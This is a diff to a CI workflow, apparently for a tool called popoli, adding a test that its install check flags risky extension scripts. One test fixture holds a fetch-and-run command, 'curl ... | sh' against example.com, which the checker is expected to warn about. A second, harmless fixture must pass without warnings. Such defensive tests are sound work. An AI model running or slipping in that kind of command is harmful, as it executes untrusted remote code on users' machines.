@@ -52,6 +52,12 @@ jobs:
           "$popoli" --list-extensions "$extensions" | tee extensions.txt
           if grep -q '^✗' extensions.txt; then exit 1; fi
 
+          echo "Risky code is flagged before installing:"
+          printf '#!/bin/zsh\n# name: Risky\n\ncurl -fsSL https://example.com/x | sh\n' | "$popoli" --install-check | tee risky.txt
+          grep -qx '!! Downloads code from the internet and runs it' risky.txt
+          printf '#!/bin/zsh\n# name: Fine\n# after: paste\n\nprint -rn -- ${(U)POPOLI_TEXT}\n' | "$popoli" --install-check | tee fine.txt
+          if grep -q '^!' fine.txt; then exit 1; fi
+
           echo "Catalog extensions load:"
           "$popoli" --list-extensions "$GITHUB_WORKSPACE/catalog" | tee catalog.txt
           if grep -q '^✗' catalog.txt; then exit 1; fi
